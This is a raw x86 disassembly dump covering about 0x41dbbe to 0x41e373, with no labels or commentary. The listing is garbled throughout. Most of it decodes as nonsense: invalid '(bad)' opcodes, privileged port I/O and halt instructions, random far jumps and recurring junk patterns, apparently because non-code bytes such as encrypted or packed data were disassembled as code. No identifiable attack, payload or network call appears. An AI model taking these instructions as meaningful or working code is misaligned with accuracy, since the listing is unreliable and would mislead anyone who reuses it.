  41dbbe:	xor    al,0xd0
  41dbc0:	call   0xc50d527e
  41dbc5:	push   ebx
  41dbc6:	bound  esi,QWORD PTR [ebx-0x7aea7972]
  41dbcc:	pop    ebp
  41dbcd:	inc    edx
  41dbce:	jnp    0x41dbd9
  41dbd0:	mov    eax,0xf56009f8
  41dbd5:	mov    dh,BYTE PTR [edx-0x63]
  41dbd8:	mov    dl,BYTE PTR [ebp+0x6136c71d]
  41dbde:	fcomp  st(7)
  41dbe0:	adc    ebp,DWORD PTR ds:0xa628f5c3
  41dbe6:	loop   0x41dc30
  41dbe8:	xlat   BYTE PTR ds:[bx]
  41dbea:	fsub   DWORD PTR [edi]
  41dbec:	sbb    BYTE PTR [edi-0xe],dl
	...
  41dbfb:	dec    eax
  41dbfc:	in     al,0x3
  41dbfe:	fwait
  41dbff:	scas   eax,DWORD PTR es:[edi]
  41dc00:	(bad)  
  41dc01:	fdiv   st,st(7)
  41dc03:	pop    esi
  41dc04:	sub    BYTE PTR [eax+0x7dd9e8f],bl
  41dc0a:	sti    
  41dc0b:	sbb    DWORD PTR [edx+0xac0001],0x0
  41dc12:	add    BYTE PTR [ecx+edx*1-0x16],ch
  41dc16:	pop    es
  41dc17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc18:	push   ecx
  41dc19:	adc    bh,0xab
  41dc1c:	in     eax,0x96
  41dc1e:	addr16 xor ecx,edx
  41dc21:	popa   
  41dc22:	aad    0x30
  41dc24:	xchg   ecx,eax
  41dc25:	inc    ebp
  41dc26:	ja     0x41dc07
  41dc28:	mov    al,0x8a
  41dc2a:	inc    ebx
  41dc2b:	push   eax
  41dc2c:	stc    
  41dc2d:	mov    cl,0xc4
  41dc2f:	std    
  41dc30:	and    eax,0x482c4392
  41dc35:	fimul  WORD PTR [ebp+0x5b20d31f]
  41dc3b:	in     eax,dx
  41dc3c:	xor    ch,BYTE PTR [ebp-0x49]
  41dc3f:	inc    ebx
  41dc40:	push   es
  41dc41:	es add eax,0x90b8a7e8
  41dc47:	cwde   
  41dc48:	in     eax,dx
  41dc49:	mov    bl,0x1e
  41dc4b:	pop    ebp
  41dc4c:	enter  0x49d3,0xe3
  41dc50:	(bad)  
  41dc51:	stc    
  41dc52:	daa    
  41dc53:	and    al,0xaf
  41dc55:	hlt    
  41dc56:	fsub   QWORD PTR [ecx-0x66]
  41dc59:	cmp    BYTE PTR [edx+0x5c],dh
  41dc5c:	dec    esi
  41dc5d:	sbb    al,0xef
  41dc5f:	int    0x92
  41dc61:	mov    bh,0x99
  41dc63:	mov    ss,WORD PTR [edi+0x49e1c180]
  41dc69:	pop    ebp
  41dc6a:	and    ebp,0xb428ab4b
  41dc70:	jnp    0x41dc7c
  41dc72:	sbb    dl,BYTE PTR [eax]
  41dc74:	pop    ss
  41dc75:	mov    edx,0x227805e9
  41dc7a:	out    0x9,al
  41dc7c:	aad    0xc8
  41dc7e:	rcl    BYTE PTR [ebx],1
  41dc80:	cmc    
  41dc81:	fstp   QWORD PTR ds:0x35ed8e5a
  41dc87:	push   edi
  41dc88:	lock repz pop ecx
  41dc8b:	sti    
  41dc8c:	out    0xa6,al
  41dc8e:	and    BYTE PTR [ecx],0x56
  41dc91:	push   ebp
  41dc92:	mov    eax,0x6511f5dd
  41dc97:	jns    0x41dce0
  41dc99:	mov    esp,0x85e8bcaf
  41dc9e:	fist   DWORD PTR [eax+0x1b7c8a57]
  41dca4:	adc    eax,DWORD PTR [edi+esi*2]
  41dca7:	das    
  41dca8:	fistp  WORD PTR [esi-0x6fff4737]
  41dcae:	xor    bh,BYTE PTR [eax+0x3da1036b]
  41dcb4:	cmp    ah,BYTE PTR [edi+0xf]
  41dcb7:	ja     0x41dc60
  41dcb9:	js     0x41dd1c
  41dcbb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcbd:	adc    al,0xae
	...
  41dccb:	push   edx
  41dccc:	add    al,0xa2
  41dcce:	xor    dh,0xa6
  41dcd1:	jb     0x41dca7
  41dcd3:	ins    DWORD PTR es:[edi],dx
  41dcd4:	xor    dh,BYTE PTR [edx]
  41dcd6:	and    eax,0xa5d36d58
  41dcdb:	das    
  41dcdc:	fwait
  41dcdd:	add    DWORD PTR [eax],eax
  41dcdf:	lods   al,BYTE PTR ds:[esi]
  41dce0:	add    BYTE PTR [eax],al
  41dce2:	add    BYTE PTR [ecx-0x4f9ef7bf],bl
  41dce8:	mov    BYTE PTR [esi+eax*1-0x1],bh
  41dcec:	add    eax,esi
  41dcee:	gs inc eax
  41dcf0:	repnz push edx
  41dcf2:	test   DWORD PTR [edx+0x62],esp
  41dcf5:	loopne 0x41dd00
  41dcf7:	fcmovbe st,st(1)
  41dcf9:	mov    edx,0x2d69e2d2
  41dcfe:	enter  0x23a,0x42
  41dd02:	cs mov ch,0x31
  41dd05:	(bad)  
  41dd06:	mov    eax,0x68ab98af
  41dd0b:	lods   eax,DWORD PTR ds:[esi]
  41dd0c:	xor    cl,ch
  41dd0e:	addr16 add al,0x98
  41dd11:	xchg   edx,eax
  41dd12:	or     eax,0x97e3d915
  41dd17:	pop    es
  41dd18:	push   ecx
  41dd19:	push   esp
  41dd1a:	repnz es or ch,ah
  41dd1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd1f:	aaa    
  41dd20:	(bad)  
  41dd21:	icebp  
  41dd22:	sub    ecx,0xdd6e49d1
  41dd28:	cmp    DWORD PTR [esi+0x69],0xfffffff0
  41dd2c:	adc    ebx,esp
  41dd2e:	push   esp
  41dd2f:	or     al,0x4f
  41dd31:	cmp    ecx,esp
  41dd33:	sub    al,0x9c
  41dd35:	jne    0x41dcbc
  41dd37:	xor    ebp,edi
  41dd39:	sbb    ebx,ebp
  41dd3b:	mov    esi,DWORD PTR [ebx+0x637a32c3]
  41dd41:	ja     0x41dd14
  41dd43:	in     al,dx
  41dd44:	fdiv   DWORD PTR [esi+ecx*8+0x6a]
  41dd48:	int    0x4f
  41dd4a:	pop    esp
  41dd4b:	sub    bh,BYTE PTR [ebx-0x5b]
  41dd4e:	mov    eax,0x2d39e056
  41dd53:	jle    0x41dd08
  41dd55:	iret   
  41dd56:	jmp    0x41dceb
  41dd58:	push   ebp
  41dd59:	dec    eax
  41dd5a:	mov    bl,0x18
  41dd5c:	jbe    0x41dd57
  41dd5e:	jno    0x41dd72
  41dd60:	pop    ebp
  41dd61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd62:	cmp    ah,BYTE PTR [esi]
  41dd64:	retf   
  41dd65:	popf   
  41dd66:	dec    edi
  41dd67:	in     al,0x29
  41dd69:	lea    esp,[bp+si]
  41dd6c:	pop    ebx
  41dd6d:	dec    esp
  41dd6e:	pop    edx
  41dd6f:	outs   dx,DWORD PTR ds:[esi]
  41dd70:	mov    cl,dh
  41dd72:	xchg   edi,eax
  41dd73:	xlat   BYTE PTR ds:[ebx]
  41dd74:	jmp    FWORD PTR [esi-0x60]
  41dd77:	les    eax,FWORD PTR [eax]
  41dd79:	(bad)  
  41dd7a:	jp     0x41ddbc
  41dd7c:	mov    ds:0x8d7c508a,eax
  41dd81:	and    eax,0xa320ff1a
  41dd86:	pop    es
  41dd87:	lds    ebx,FWORD PTR [ecx-0x712b69ba]
  41dd8d:	mov    WORD PTR [edx+0x0],cs
	...
  41dd98:	add    BYTE PTR [eax],al
  41dd9a:	add    BYTE PTR [eax],bh
  41dd9c:	push   0xffffff96
  41dd9e:	add    edx,esi
  41dda0:	(bad)  
  41dda1:	mov    ebp,0xdb4ef67b
  41dda6:	out    0x14,eax
  41dda8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dda9:	inc    ebp
  41ddaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddab:	fistp  DWORD PTR [ebx+0xac0001]
  41ddb1:	add    BYTE PTR [eax],al
  41ddb3:	mov    edx,0xcc623ec9
  41ddb8:	fcomp  st(5)
  41ddba:	cdq    
  41ddbb:	mov    WORD PTR [ebp-0x4be69b6],es
  41ddc1:	data16 mov dh,0xd7
  41ddc4:	test   DWORD PTR [edx],0xa874cc2e
  41ddca:	aad    0xc
  41ddcc:	js     0x41ddb9
  41ddce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddcf:	shl    BYTE PTR [edx+edi*1-0xa],0x92
  41ddd4:	sbb    eax,0xd1ec4c25
  41ddd9:	sbb    DWORD PTR [edx-0xf],edx
  41dddc:	jbe    0x41de43
  41ddde:	mov    cl,0x96
  41dde0:	add    eax,DWORD PTR [edx-0x69b57a4f]
  41dde6:	mov    es,WORD PTR [edx-0x45]
  41dde9:	jne    0x41dd87
  41ddeb:	add    edi,esp
  41dded:	fs aaa 
  41ddef:	lods   al,BYTE PTR ds:[esi]
  41ddf0:	cmp    DWORD PTR [esp+ecx*8-0x56],esi
  41ddf4:	jb     0x41ddcf
  41ddf6:	push   ss
  41ddf7:	push   esi
  41ddf8:	sbb    ebx,ecx
  41ddfa:	mov    WORD PTR [ebx+0x437563a7],es
  41de00:	fcom   DWORD PTR [ebx+0x4e]
  41de03:	fs hlt 
  41de05:	xchg   esp,eax
  41de06:	add    eax,0xc8d71be0
  41de0b:	xor    eax,0xcb199947
  41de10:	sub    BYTE PTR [ebx-0x4f],ah
  41de13:	or     bl,0x46
  41de16:	lods   eax,DWORD PTR ds:[esi]
  41de17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de18:	into   
  41de19:	or     eax,0x1e131d2a
  41de1e:	int    0x40
  41de20:	je     0x41de07
  41de22:	fmul   DWORD PTR [eax+0x77]
  41de25:	loopne 0x41ddbe
  41de27:	pop    esi
  41de28:	and    DWORD PTR [eax+0x4c],edi
  41de2b:	or     eax,0xc1046c38
  41de30:	retf   
  41de31:	xchg   ebx,eax
  41de32:	pop    eax
  41de33:	jge    0x41deb3
  41de35:	cmp    eax,DWORD PTR [esi-0x5be0efae]
  41de3b:	or     BYTE PTR [esi+0x19],0x79
  41de3f:	in     al,0x42
  41de41:	retf   
  41de42:	mov    esp,0xcdc5ec11
  41de47:	dec    ebx
  41de48:	retf   0xc1dd
  41de4b:	jecxz  0x41decc
  41de4d:	shl    DWORD PTR [ecx-0x65],1
  41de50:	push   0x38
  41de52:	mov    DWORD PTR fs:[edi-0x37],eax
  41de56:	push   esp
  41de57:	dec    edi
  41de58:	sbb    edi,ebp
  41de5a:	dec    eax
  41de5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de5c:	call   0x0:0xd143
	...
  41de6b:	jmp    0x7a725929
  41de70:	repz jmp 0x41de6c
  41de73:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41de77:	cwde   
  41de78:	stos   BYTE PTR es:[edi],al
  41de79:	xor    eax,0x19c8784
  41de7e:	add    BYTE PTR [eax+eax*1-0x34200000],ch
  41de85:	not    BYTE PTR ds:[ebx]
  41de88:	fbstp  TBYTE PTR [esi]
  41de8a:	dec    ebx
  41de8b:	mov    dh,0xd8
  41de8d:	leave  
  41de8e:	pushf  
  41de8f:	xchg   ebx,eax
  41de90:	push   edi
  41de91:	nop
  41de92:	loopne 0x41de6a
  41de94:	cmp    al,0x40
  41de96:	mov    esi,0x260ea197
  41de9b:	cdq    
  41de9c:	xchg   BYTE PTR [ebx],al
  41de9e:	in     eax,0xd7
  41dea0:	loop   0x41de3b
  41dea2:	ins    BYTE PTR es:[edi],dx
  41dea3:	jo     0x41de73
  41dea5:	out    dx,al
  41dea6:	sbb    eax,0x28085cc1
  41deab:	sbb    BYTE PTR [esi-0x43228254],dl
  41deb1:	dec    eax
  41deb2:	mov    cl,0xf6
  41deb4:	push   eax
  41deb5:	les    ebp,FWORD PTR [esi+0x16f6b2db]
  41debb:	cs dec edi
  41debd:	xor    bh,BYTE PTR [eax+0x11]
  41dec0:	test   BYTE PTR [esi+0x75599b6f],dl
  41dec6:	cmp    DWORD PTR ds:0x67ff8e69,edx
  41decc:	stos   BYTE PTR es:[edi],al
  41decd:	push   esp
  41dece:	or     al,0xf5
  41ded0:	ret    
  41ded1:	xchg   dl,bl
  41ded3:	loopne 0x41de93
  41ded5:	mov    ecx,DWORD PTR [esi]
  41ded7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ded8:	and    eax,0x2fdabac4
  41dedd:	or     BYTE PTR [edi+0x46b9ee92],dl
  41dee3:	idiv   esi
  41dee5:	or     BYTE PTR [ebx+ecx*8-0x18c19f1e],ah
  41deec:	mov    WORD PTR [esi],?
  41deee:	aaa    
  41deef:	cld    
  41def0:	xor    DWORD PTR [esi+eax*1+0x323adae8],ebp
  41def7:	mul    esp
  41def9:	xchg   edx,eax
  41defa:	push   ebx
  41defb:	sub    BYTE PTR [ecx-0x4f897796],ch
  41df01:	clc    
  41df02:	out    dx,al
  41df03:	lds    edx,FWORD PTR [eax]
  41df05:	jne    0x41df27
  41df07:	nop
  41df08:	ret    
  41df09:	fstp   QWORD PTR [edi-0x5a]
  41df0c:	add    DWORD PTR [esp+esi*2+0x11],0xa71a213f
  41df14:	je     0x41dee4
  41df16:	lods   al,BYTE PTR ds:[si]
  41df18:	(bad)  [ecx]
  41df1a:	int3   
  41df1b:	lock ja 0x41df32
  41df1e:	add    edi,DWORD PTR [eax]
  41df20:	cld    
  41df21:	mov    bl,0x46
  41df23:	or     eax,0xa5ac87b1
  41df28:	rcl    BYTE PTR [ebx-0x6da84bf1],0xd6
	...
  41df3b:	pop    ebx
  41df3c:	inc    ecx
  41df3d:	pop    ebx
  41df3e:	iret   
  41df3f:	pop    ebx
  41df40:	(bad)  
  41df42:	aad    0xf
  41df44:	ss dec esp
  41df46:	dec    esi
  41df47:	xchg   esi,eax
  41df48:	dec    edi
  41df49:	xchg   BYTE PTR [ebx],bl
  41df4b:	xor    ebx,DWORD PTR [ebp+0xac0001]
  41df51:	add    BYTE PTR [eax],al
  41df53:	je     0x41df25
  41df55:	(bad)  
  41df56:	test   eax,0x2d795d65
  41df5b:	cmp    DWORD PTR [esi-0x33eea1fc],eax
  41df61:	pop    edi
  41df62:	mov    eax,0xbb26544e
  41df67:	popa   
  41df68:	test   BYTE PTR [eax+edx*8-0x223a6dbd],0x8a
  41df70:	into   
  41df71:	sbb    ah,BYTE PTR [ebx+0x56]
  41df74:	push   ebp
  41df75:	mov    dh,0x32
  41df77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df78:	sbb    DWORD PTR [ecx-0x34c60cd7],ebx
  41df7e:	daa    
  41df7f:	in     eax,0xa7
  41df81:	inc    ebp
  41df82:	scas   al,BYTE PTR es:[edi]
  41df83:	and    edi,DWORD PTR [ebx-0x17]
  41df86:	pop    eax
  41df87:	mov    esi,DWORD PTR [ebx]
  41df89:	and    ah,BYTE PTR [esi+edx*1-0x4ed3db1c]
  41df90:	jmp    0x379c:0x4c688100
  41df97:	add    eax,ebx
  41df99:	es fcmovu st,st(7)
  41df9c:	ja     0x41dfd3
  41df9e:	mov    eax,ds:0x7f259112
  41dfa3:	pop    eax
  41dfa4:	fsubr  DWORD PTR [eax]
  41dfa6:	fs (bad) 
  41dfa9:	enter  0xb124,0x94
  41dfad:	inc    ebx
  41dfae:	ror    BYTE PTR [ebx+0x11bdfb76],1
  41dfb4:	push   eax
  41dfb5:	dec    edi
  41dfb6:	outs   dx,DWORD PTR ds:[esi]
  41dfb7:	add    DWORD PTR [eax-0x68],eax
  41dfba:	jno    0x41dfce
  41dfbc:	in     al,0xc
  41dfbe:	cwde   
  41dfbf:	aaa    
  41dfc0:	push   esi
  41dfc1:	repz pop ebp
  41dfc3:	add    ecx,edx
  41dfc5:	les    eax,FWORD PTR [ecx+0x12e233ef]
  41dfcb:	jmp    0xb7fc:0x9ac101b0
  41dfd2:	dec    ebp
  41dfd3:	push   esp
  41dfd4:	dec    esi
  41dfd5:	cmp    al,BYTE PTR [edi]
  41dfd7:	es sub bh,ah
  41dfda:	jmp    0x2771:0x98eca9e5
  41dfe1:	repz test DWORD PTR [edi],esp
  41dfe4:	pop    es
  41dfe5:	adc    eax,DWORD PTR [ecx]
  41dfe7:	fldcw  WORD PTR [edi+0x231f3316]
  41dfed:	ds iret 
  41dfef:	in     al,0x1a
  41dff1:	hlt    
  41dff2:	mov    cl,0x65
  41dff4:	fst    QWORD PTR [edx+0x551e62b8]
  41dffa:	dec    eax
  41dffb:	mov    al,bh
  41dffd:	mov    edx,0x4d
	...
  41e00a:	add    BYTE PTR [ebx+0x7f3c6585],bl
  41e010:	cld    
  41e011:	(bad)  [edi-0x65be08a1]
  41e017:	sub    bh,BYTE PTR [eax-0x7a]
  41e01a:	pop    edx
  41e01b:	fistp  WORD PTR [ebp+0xac0001]
  41e021:	add    BYTE PTR [eax],al
  41e023:	inc    esi
  41e024:	mov    ebp,ecx
  41e026:	popf   
  41e027:	and    al,BYTE PTR [edx+0x1691b052]
  41e02d:	pop    edx
  41e02e:	cwde   
  41e02f:	popf   
  41e030:	sub    al,0x69
  41e032:	sub    al,dh
  41e034:	mov    DWORD PTR [esi+eiz*8+0x52839059],ebx
  41e03b:	mov    dl,0x95
  41e03d:	inc    esp
  41e03e:	popa   
  41e03f:	out    dx,al
  41e040:	sbb    al,0x5d
  41e042:	das    
  41e043:	fwait
  41e044:	out    dx,eax
  41e045:	arpl   WORD PTR [edi-0xaf15866],di
  41e04b:	jnp    0x41e0b8
  41e04d:	bound  ebx,QWORD PTR [ebx-0x5991e62a]
  41e053:	cs aas 
  41e055:	cli    
  41e056:	inc    esi
  41e057:	inc    esp
  41e058:	mov    ds:0x181137ce,eax
  41e05d:	je     0x41e00f
  41e05f:	sub    bh,BYTE PTR [ebp+0x5]
  41e062:	mov    ds:0x2bdab28a,eax
  41e067:	mov    ebp,DWORD PTR fs:[edi]
  41e06a:	lock pop ss
  41e06c:	bswap  eax
  41e06e:	mov    ecx,0x5388e2a0
  41e073:	icebp  
  41e074:	xchg   esi,eax
  41e075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e076:	xchg   ecx,eax
  41e077:	lea    ebx,[esi+eax*8+0x55]
  41e07b:	adc    BYTE PTR [edx],bh
  41e07d:	xchg   DWORD PTR [edx-0x45],esp
  41e080:	les    esi,FWORD PTR [edx]
  41e082:	xor    eax,0xf7c6679e
  41e087:	jb     0x41e0ae
  41e089:	sahf   
  41e08a:	sar    BYTE PTR ds:0x81914080,0x2e
  41e091:	jns    0x41e03e
  41e093:	lock dec ebx
  41e095:	adc    al,0x19
  41e097:	xchg   edi,eax
  41e098:	inc    edi
  41e099:	fst    st(0)
  41e09b:	push   ebp
  41e09c:	add    eax,0x19370d18
  41e0a1:	mov    ds:0xa2cbc28d,al
  41e0a6:	bound  esp,QWORD PTR [ecx-0x7f14620f]
  41e0ac:	xor    eax,0xcc82b4b
  41e0b1:	cmp    DWORD PTR [edi+0x75],esi
  41e0b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0b5:	(bad)  
  41e0b6:	jl     0x41e086
  41e0b8:	xchg   BYTE PTR [esi],ah
  41e0ba:	enter  0xf66d,0x93
  41e0be:	mov    ebp,0x6ce400f8
  41e0c3:	fisub  WORD PTR [edx+edx*2+0x65ada0e5]
  41e0ca:	clc    
  41e0cb:	add    BYTE PTR [ecx],bl
  41e0cd:	push   ds
  41e0ce:	dec    edi
	...
  41e0db:	outs   dx,BYTE PTR ds:[esi]
  41e0dc:	jae    0x41e0ce
  41e0de:	retf   0xcbfd
  41e0e1:	jle    0x41e0da
  41e0e3:	repz xor eax,0xe1198ce9
  41e0e9:	clc    
  41e0ea:	imul   ecx,DWORD PTR [ebx-0x53fffe62],0x0
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	gs sub al,0xee
  41e0f6:	cmp    cl,bh
  41e0f8:	sub    BYTE PTR [ebp+0x72b5f7a],0x85
  41e0ff:	jno    0x41e12f
  41e101:	aaa    
  41e102:	inc    esi
  41e103:	lock mov dh,0x86
  41e106:	sub    ecx,DWORD PTR [ebp+0x124f381a]
  41e10c:	xlat   BYTE PTR ds:[ebx]
  41e10d:	nop
  41e10e:	rol    DWORD PTR [eax-0x14aadc12],0x4d
  41e115:	inc    ebx
  41e116:	push   ss
  41e117:	push   esp
  41e118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e119:	push   eax
  41e11a:	mov    fs,WORD PTR [ebp-0x3a]
  41e11d:	out    0xdb,al
  41e11f:	sar    BYTE PTR [esi+0x7],cl
  41e122:	pop    ebp
  41e123:	push   edi
  41e124:	jbe    0x41e198
  41e126:	push   ebp
  41e127:	hlt    
  41e128:	loop   0x41e111
  41e12a:	scas   al,BYTE PTR es:[edi]
  41e12b:	push   esp
  41e12c:	sub    DWORD PTR [ebx-0x5d08be48],ecx
  41e132:	jmp    0xf53309dc
  41e137:	inc    ebx
  41e138:	dec    edx
  41e139:	sbb    eax,0x3904446f
  41e13e:	stos   DWORD PTR es:[edi],eax
  41e13f:	push   ebp
  41e140:	or     bh,BYTE PTR [edx-0x79]
  41e143:	arpl   WORD PTR [ebx],sp
  41e145:	sti    
  41e146:	xchg   esi,eax
  41e147:	xchg   edi,eax
  41e148:	aad    0x3a
  41e14a:	out    0xac,eax
  41e14c:	cmp    DWORD PTR [ecx-0x62],0x50511169
  41e153:	popf   
  41e154:	addr16 or ebx,esp
  41e157:	ins    BYTE PTR es:[edi],dx
  41e158:	nop
  41e159:	sbb    edx,ecx
  41e15b:	mov    ebx,0x157020f4
  41e160:	and    eax,0x669d830
  41e165:	test   al,0x9f
  41e167:	pop    edi
  41e168:	lahf   
  41e169:	stos   DWORD PTR es:[edi],eax
  41e16a:	test   DWORD PTR ds:0x992153c1,ebp
  41e170:	mov    BYTE PTR [ebx-0x6e7f3b77],cl
  41e176:	and    cl,BYTE PTR [ecx+0x49]
  41e179:	scas   al,BYTE PTR es:[edi]
  41e17a:	mov    ds:0x69960292,eax
  41e17f:	pop    esi
  41e180:	xor    al,0x4b
  41e182:	push   cs
  41e183:	(bad)  
  41e184:	inc    esi
  41e185:	pusha  
  41e186:	mov    ?,WORD PTR [ebx]
  41e188:	je     0x41e135
  41e18a:	fnstcw WORD PTR [ebp+0x79]
  41e18d:	sahf   
  41e18e:	sub    bh,dh
  41e190:	loope  0x41e1c1
  41e192:	or     eax,0xb6bd9e9c
  41e197:	fistp  WORD PTR ds:0xf36fe254
  41e19d:	push   ss
  41e19e:	pop    edx
	...
  41e1ab:	cmc    
  41e1ac:	adc    al,0xae
  41e1ae:	adc    ebp,edi
  41e1b0:	mov    ebx,0x84e6f6fd
  41e1b5:	lds    ebp,FWORD PTR [edx-0x35568acb]
  41e1bb:	aaa    
  41e1bc:	lahf   
  41e1bd:	add    DWORD PTR [eax],eax
  41e1bf:	lods   al,BYTE PTR ds:[esi]
  41e1c0:	add    BYTE PTR [eax],al
  41e1c2:	add    BYTE PTR [ebx],ch
  41e1c4:	cmp    DWORD PTR [esi-0x78f4f6b6],eax
  41e1ca:	fstp   QWORD PTR [ebp+edx*2+0x34bfda1a]
  41e1d1:	push   edx
  41e1d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1d3:	shl    DWORD PTR ds:0xc9ec0384,0x89
  41e1da:	xor    BYTE PTR [ebp+0x41],dh
  41e1dd:	daa    
  41e1de:	fcmovu st,st(6)
  41e1e0:	icebp  
  41e1e1:	retf   
  41e1e2:	enter  0xb0c1,0x74
  41e1e6:	lods   al,BYTE PTR ds:[esi]
  41e1e7:	cmp    al,0x1f
  41e1e9:	arpl   WORD PTR [ebp-0x66],bp
  41e1ec:	(bad)  
  41e1ee:	sub    BYTE PTR [ebx+esi*8+0x75],dh
  41e1f2:	in     al,dx
  41e1f3:	cdq    
  41e1f4:	iret   
  41e1f5:	or     DWORD PTR [ecx-0x4ead3076],ecx
  41e1fb:	xchg   ecx,eax
  41e1fc:	xchg   esp,eax
  41e1fd:	inc    ebp
  41e1fe:	push   edi
  41e1ff:	cmc    
  41e200:	push   eax
  41e201:	(bad)  
  41e202:	in     al,dx
  41e203:	(bad)  
  41e204:	retf   
  41e205:	inc    edi
  41e206:	jmp    0x920b1776
  41e20b:	sbb    BYTE PTR [ebx],ch
  41e20d:	jmp    0x68d4:0x8e147ba6
  41e214:	ja     0x41e219
  41e216:	rol    ecx,cl
  41e218:	not    DWORD PTR [edi]
  41e21a:	pop    edx
  41e21b:	js     0x41e1af
  41e21d:	popf   
  41e21e:	shr    BYTE PTR [ecx-0x1e],0xcd
  41e222:	lea    ebp,[edi-0x92c1a81]
  41e228:	mov    ds:0x12dac2f6,eax
  41e22d:	pop    esi
  41e22e:	in     al,0xb7
  41e230:	addr16 mov bh,0x26
  41e233:	(bad)  
  41e234:	adc    eax,edx
  41e236:	mov    edx,0xb70f5273
  41e23b:	loope  0x41e1ec
  41e23d:	inc    ebp
  41e23e:	sub    al,0x91
  41e240:	nop    DWORD PTR [ecx+eax*8]
  41e244:	out    0x19,al
  41e246:	push   eax
  41e247:	jb     0x41e206
  41e249:	pushf  
  41e24a:	(bad)  
  41e24b:	(bad)  
  41e24c:	mov    al,ds:0x15ea6973
  41e251:	inc    edx
  41e252:	pop    ebp
  41e253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e254:	ins    DWORD PTR es:[edi],dx
  41e255:	jge    0x41e1f4
  41e257:	cmp    al,0xe1
  41e259:	outs   dx,DWORD PTR ds:[esi]
  41e25a:	lock rol BYTE PTR [ebp+eiz*2-0x3ca645f7],cl
  41e262:	ds or  ebp,esi
  41e265:	fsubr  DWORD PTR [ecx+edi*8]
  41e268:	daa    
  41e269:	lods   al,BYTE PTR ds:[esi]
  41e26a:	(bad)  
  41e26b:	sbb    al,bh
  41e26d:	std    
  41e26e:	mov    edi,0x0
	...
  41e27b:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  41e281:	mov    edi,0xbb1c16fb
  41e286:	sar    cl,0xa5
  41e289:	test   eax,0x19fe368
  41e28e:	add    BYTE PTR [eax+eax*1+0x36880000],ch
  41e295:	dec    esp
  41e296:	mov    al,cs:0xfb494ce1
  41e29c:	xchg   esp,eax
  41e29d:	sbb    al,0x2
  41e29f:	scas   eax,DWORD PTR es:[edi]
  41e2a0:	dec    edx
  41e2a1:	xor    cl,dh
  41e2a3:	shl    DWORD PTR [edi-0x3f],0x86
  41e2a7:	adc    BYTE PTR [edx+0x1b],cl
  41e2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2ab:	push   edi
  41e2ac:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41e2ae:	xor    ah,BYTE PTR [ecx+0x4]
  41e2b1:	je     0x41e2bb
  41e2b3:	imul   edi,DWORD PTR [eax],0xfffffff6
  41e2b6:	imul   esi,DWORD PTR [edx+0x33b418a0],0x43
  41e2bd:	imul   ebx,esp,0xffffffde
  41e2c0:	cmp    al,0xe7
  41e2c2:	sbb    DWORD PTR [edi],0x62f3c087
  41e2c8:	sub    DWORD PTR [edi+0x6c],esp
  41e2cb:	inc    esp
  41e2cc:	das    
  41e2cd:	stc    
  41e2ce:	pop    ecx
  41e2cf:	mov    es,WORD PTR [eax]
  41e2d1:	mov    esp,0x61dfaec5
  41e2d6:	xchg   DWORD PTR [edx+0x74b9e834],ecx
  41e2dc:	cdq    
  41e2dd:	ja     0x41e321
  41e2df:	pop    es
  41e2e0:	cld    
  41e2e1:	mov    al,0x8f
  41e2e3:	aaa    
  41e2e4:	leave  
  41e2e5:	mov    BYTE PTR [ebx],cl
  41e2e7:	lock stc 
  41e2e9:	and    al,dh
  41e2eb:	int    0x6
  41e2ed:	ficom  DWORD PTR [ebx]
  41e2ef:	cwde   
  41e2f0:	xchg   ebx,eax
  41e2f1:	popf   
  41e2f2:	jle    0x41e290
  41e2f4:	adc    BYTE PTR [edx+0x3],bh
  41e2f7:	pop    ebx
  41e2f8:	cld    
  41e2f9:	jecxz  0x41e36b
  41e2fb:	adc    eax,0x9e514151
  41e300:	imul   edi,DWORD PTR [ebx+eiz*2+0x4d5d3ed8],0xdd5e2535
  41e30b:	into   
  41e30c:	scas   al,BYTE PTR es:[edi]
  41e30d:	cwde   
  41e30e:	inc    ebx
  41e30f:	xor    ecx,ecx
  41e311:	stos   DWORD PTR es:[edi],eax
  41e312:	mov    eax,ds:0xb5d8419
  41e317:	and    BYTE PTR [edx],dl
  41e319:	add    eax,0x8108c3e9
  41e31e:	mov    bl,0x2f
  41e320:	imul   esp,DWORD PTR [edi-0x1a7850db],0xffffffb4
  41e327:	out    dx,al
  41e328:	enter  0xcbb8,0xfd
  41e32c:	ja     0x41e33d
  41e32e:	ins    DWORD PTR es:[edi],dx
  41e32f:	push   eax
  41e330:	mov    al,ds:0x7c32a1bc
  41e335:	sbb    DWORD PTR [edi-0x8263f33],edx
  41e33b:	inc    esp
  41e33c:	xlat   BYTE PTR ds:[ebx]
  41e33d:	and    esp,ebp
	...
  41e34b:	aam    0xf
  41e34d:	push   ecx
  41e34e:	lock (bad) 
  41e351:	cmc    
  41e352:	das    
  41e353:	sbb    BYTE PTR [eax],cl
  41e355:	xchg   ebx,eax
  41e356:	iret   
  41e357:	dec    ebx
  41e358:	lea    edx,[eax-0x1a]
  41e35b:	(bad)  
  41e35c:	mov    al,ds:0xac0001
  41e361:	add    BYTE PTR [eax],al
  41e363:	inc    ebp
  41e364:	mov    bh,0xa9
  41e366:	es dec ebx
  41e368:	inc    esp
  41e369:	aam    0x9a
  41e36b:	icebp  
  41e36c:	aas    
  41e36d:	xchg   edx,eax
  41e36e:	cmc    
  41e36f:	loop   0x41e36d
  41e371:	sub    ebp,esi
  41e373:	outs   dx,BYTE PTR ds:[esi]
